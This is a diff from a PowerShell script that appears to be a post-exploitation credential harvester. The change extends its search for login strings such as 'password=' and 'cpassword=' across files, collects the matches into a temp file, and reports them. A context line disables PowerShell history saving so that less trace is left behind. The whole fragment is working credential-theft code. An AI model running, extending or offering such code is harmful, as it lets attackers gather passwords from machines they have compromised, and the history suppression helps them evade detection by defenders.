@@ -135,11 +135,11 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
          
            ForEach($Item in $dAtAbAsEList){## Search in $dAtAbAsEList for login strings
               Get-Content -Path "$Item" -EA SilentlyContinue -Force|
-              Select-String "user:","pass:","username:","pwd:","passw:","password:","login:","logon:" >> $Env:TMP\passwd.txt
+              Select-String -Pattern "user:","pass:","username:","pwd:","passw:","password:","login:","logon:","cpassword=","username=","user name=","password=","pass=","pwd=","passw=","login=","logon=" >> $Env:TMP\passwd.txt
            }
 
            $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt" -EA SilentlyContinue|
-               Select-String -pattern "user:","pass:","username:","pwd:","passw:","password:","login:","logon:"|
+               Select-String -Pattern "user:","pass:","username:","pwd:","passw:","password:","login:","logon:","cpassword=","username=","user name=","password=","pass=","pwd=","passw=","login=","logon="|
                findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}
            If($ChekCreds -ieq $null){## None credentials found
               Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
